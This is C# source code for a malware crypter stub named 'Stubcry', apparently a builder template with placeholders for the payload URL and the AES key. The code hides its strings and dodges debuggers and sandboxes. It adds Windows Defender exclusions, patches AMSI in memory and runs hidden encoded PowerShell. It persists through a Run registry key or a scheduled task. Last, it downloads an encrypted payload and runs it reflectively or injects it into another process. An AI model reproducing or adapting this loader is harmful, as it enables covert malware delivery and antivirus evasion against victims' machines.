using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

[assembly: AssemblyTitle("#AssemblyProduct")]
[assembly: AssemblyDescription("#AssemblyDescription")]
[assembly: AssemblyCompany("#AssemblyProduct")]
[assembly: AssemblyProduct("#AssemblyProduct")]
[assembly: AssemblyCopyright("#AssemblyCopyright")]
[assembly: AssemblyTrademark("#AssemblyTrademark")]
[assembly: AssemblyFileVersion("#AssemblyMajorVersion" + "." + "#AssemblyMinorVersion" + "." + "#AssemblyBuildPart" + "." + "#AssemblyPrivatePart")]
[assembly: AssemblyVersion("#AssemblyMajorVersion" + "." + "#AssemblyMinorVersion" + "." + "#AssemblyBuildPart" + "." + "#AssemblyPrivatePart")]
[assembly: Guid("#Guid")]
[assembly: ComVisible(false)]

namespace Stubcry
{


    static class Program
    {

        [StructLayout(LayoutKind.Explicit, Size = 104)]
        public struct StartupInfo
        {
            [FieldOffset(0)]
            public uint cb;
            [FieldOffset(60)]
            public uint dwFlags;
            [FieldOffset(64)]
            public ushort wShowWindow;
        }
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        public static byte[] FOKFILE(string base64Cipher, string base64Key, string base64IV)
        {
            byte[] cipherBytes = Convert.FromBase64String(base64Cipher);
            byte[] key = Convert.FromBase64String(base64Key);
            byte[] iv = Convert.FromBase64String(base64IV);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;

                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
                using (MemoryStream msDecrypt = new MemoryStream(cipherBytes))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (MemoryStream msPlain = new MemoryStream())
                        {
                            byte[] buffer = new byte[1024];
                            int readBytes;
                            while ((readBytes = csDecrypt.Read(buffer, 0, buffer.Length)) > 0)
                            {
                                msPlain.Write(buffer, 0, readBytes);
                            }
                            byte[] plainBytes = msPlain.ToArray();
                            return plainBytes;
                        }
                    }
                }
            }
        }


        static void NIKFELSTART(string servicename)
        {

            Microsoft.Win32.RegistryKey HELPER = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(FOKSTRING(@"N1o8DA4FNS1BOxpGAEBXBB9jBVMfJhwWIB4KVQoyCQUmO1ITD1MEXFgGBFEf", "V2yPogCK$IS!a22aw3Y5uDmwVT"), true);
            HELPER.SetValue(servicename, config.fullpath);
            HELPER.Dispose();
            HELPER.Close();
        }
        static void Taskzebi(string servicename, int minutes)
        {
            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = FOKSTRING("JFkLfgkfJSVDPCNH", "V2yPogCK$IS!a22aw3Y5uDmwVT"),
                    CreateNoWindow = false,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = "/create /sc MINUTE /mo " + minutes + " /tn \"" + servicename + "\" /tr \"" + config.folder + "\\" + config.FileName + "\" /f"

                };
                Process.Start(startInfo);
            }
            catch
            {

            }
        }
        public static void jibzok(byte[] zebizebi)
        {
            try
            {
                byte[] fakeBytes = new byte[1024];
                byte[] combinedBytes = new byte[zebizebi.Length + fakeBytes.Length];
                Buffer.BlockCopy(zebizebi, 0, combinedBytes, 0, zebizebi.Length);
                Buffer.BlockCopy(fakeBytes, 0, combinedBytes, zebizebi.Length, fakeBytes.Length);

                Assembly jib = null;

                for (int i = 0; i < combinedBytes.Length; i++)
                {
                    if (combinedBytes[i] == 0x4d && combinedBytes[i + 1] == 0x5a)
                    {
                        jib = Assembly.Load(combinedBytes);
                        break;
                    }
                }

                if (jib != null)
                {
                    MethodInfo enter = jib.EntryPoint;

                    if (enter.ReturnType == typeof(void))
                    {
                        enter.Invoke(null, null);
                    }
                    else
                    {
                        object gas = enter.Invoke(null, null);
                    }
                }
            }
            catch
            {
            }
        }




        static void MCHHNE(string destinationDirectory, string newName)
        {
            string setupsoftware = System.Reflection.Assembly.GetEntryAssembly().Location;
            string wheretogo = Path.Combine(destinationDirectory, newName);

            File.Copy(setupsoftware, wheretogo, true);
        }

        static string FOKSTRING(string encrypted, string key)
        {

            List<byte> bytes = Convert.FromBase64String(encrypted).ToList();
            string MAKLOUB = "";
            for (int i = 0; i < bytes.Count; i++)
            {
                int c = bytes[i] ^ key[(i % key.Length)];
                MAKLOUB += Convert.ToChar(c);
            }

            string KAYSAR = new string(MAKLOUB.Reverse().ToArray());

            string message = "";
            for (int i = 0; i < KAYSAR.Length; i++)
            {
                int c = KAYSAR[i];
                if ((c >= 65 && c <= 77) || (c >= 97 && c <= 109))
                {
                    c += 13;
                }
                else if ((c >= 78 && c <= 90) || (c >= 110 && c <= 122))
                {
                    c -= 13;
                }
                message += Convert.ToChar(c);
            }

            return message;
        }
        public static string abathr(string B)
        {
            string C = string.Empty;
            HttpWebRequest D = (HttpWebRequest)WebRequest.Create(B);
            D.Method = FOKSTRING("DCd+", "Ku*VyShAV%IcMcFa");
            HttpWebResponse E = (HttpWebResponse)D.GetResponse();
            using (Stream F = E.GetResponseStream())
            {
                using (StreamReader G = new StreamReader(F))
                {
                    C = G.ReadToEnd();
                }
            }
            return C;
        }
        public static void Sandboxzebizebi()
        {
            while (true)
            {
                if (Cursor.Position != lastCursorPosition)
                {
                    Thread.Sleep(10000);
                    return;
                }

                if (Debugger.IsAttached)
                {
                    Thread.Sleep(60000);
                    return;
                }

                if (IsRunningInVirtualEnvironment())
                {
                    Thread.Sleep(30000);
                    return;
                }

                Thread.Sleep(1000);
            }
        }
        static void nikamsi()
        {
            IntPtr loadLibrary = LoadLibrary(FOKSTRING("ORQ8cBEtPhQ=", "@mM^gKDz#r4ZpKvI"));
            IntPtr address = GetProcAddress(loadLibrary, FOKSTRING("JR8+LQ8EJRRTNEI8CgU=", "@mM^gKDz#r4ZpKvI"));
            uint oldProtect;
            VirtualProtect(address, (UIntPtr)5, 0x40, out oldProtect);
            byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            Marshal.Copy(patch, 0, address, 6);
        }
        static string PowershellStage(string encodedCommand)
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = FOKSTRING("MgY/cB4yNg9FF0YwEig=", "@mM^gKDz#r4ZpKvI");
            psi.Arguments = "–eNco " + encodedCommand;
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;

            using (Process process = Process.Start(psi))
            {
                process.WaitForExit();
            }

            return string.Empty;

        }



        static bool IsRunningInVirtualEnvironment()
        {

            return false;
        }

        static Point lastCursorPosition = Cursor.Position;

        static string niklhaomha(string zebi)
        {
            if (config.issleep == true)
            {
                Thread.Sleep(config.sleeptime);
            }

            if (config.isexcludewd == true && config.fullpath != config.ePath)
            {
                string[] Sakerdef = new string[] { FOKSTRING("GFMvLFIoOTIOK1AfTkUXOw==", "j#N^7ZJ@kh3Ec4fu"), FOKSTRING("H0QgHVY4PCYDEUMuMRk=", "j#N^7ZJ@kh3Ec4fu"), "C:\\" };

                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = FOKSTRING("GEg8cE4jODUtDUEvAXc=", "j#N^7ZJ@kh3Ec4fu");
                psi.Arguments = string.Join(" ", Sakerdef);
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                psi.Verb = FOKSTRING("DE0vNlI=", "j#N^7ZJ@kh3Ec4fu");

                try
                {
                    Process.Start(psi);
                }
                catch
                {

                }

            }
            if (config.ispassamsi == true)
            {
                nikamsi();

            }
            if (config.ispwcommand == true)
            {
                PowershellStage(config.command);
            }
            if (!Directory.Exists(config.folder) && config.ispersist == true)
            {
                Directory.CreateDirectory(config.folder);
                MCHHNE(config.folder, config.FileName);

            }
            else if (!File.Exists(config.fullpath) && config.ispersist == true)
            {
                MCHHNE(config.folder, config.FileName);

            }

            if (config.ispersist == true && config.istartup == true)
            {
                NIKFELSTART(config.servicename);
            }
            else if (config.ispersist == true && config.istask == true)
            {
                Taskzebi(config.servicename, config.taskm);
            }
            List<char> code = abathr(Encoding.UTF8.GetString(Convert.FromBase64String("$URL"))).ToList();
            code.Reverse();

            string magicalcode = new string(code.ToArray());
            if (config.isdotnetload == true)
            {
                nikamsi();

                jibzok(FOKFILE(magicalcode.Replace(",", "").Replace("'", ""), "$key", "$IV"));
            }
            else if (config.isrunportal32 == true)
            {
                if (config.isNative == true)
                {
                    NIKBINARY32bit.nik5ra(config.nativeipath, "", FOKFILE(magicalcode.Replace(",", "").Replace("'", ""), "$key", "$IV"));
                }
                else
                {
                    NIKBINARY32bit.nik5ra(config.dotnetipath, "", FOKFILE(magicalcode.Replace(",", "").Replace("'", ""), "$key", "$IV"));

                }


            }
            else if (config.isrunportal64 == true)
            {
                if (config.isNative == true)
                {
                    nIK64.openfile(FOKFILE(magicalcode.Replace(",", "").Replace("'", ""), "$key", "$IV"), config.nativeipath, "");
                }
                else
                {
                    nIK64.openfile(FOKFILE(magicalcode.Replace(",", "").Replace("'", ""), "$key", "$IV"), config.dotnetipath, "");

                }
            }

            if (zebi.Length > 0)
            {
                Console.WriteLine("hakeka");
            }
            else
            {
                Console.WriteLine("yedha");
            }
            return zebi;

        }

        [STAThread]
        static void Main()
        {
            Console.WriteLine("Normal Task");
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            Sandboxzebizebi();
            Thread.Sleep(1000);
            niklhaomha("3ASBA");



        }


    }
}
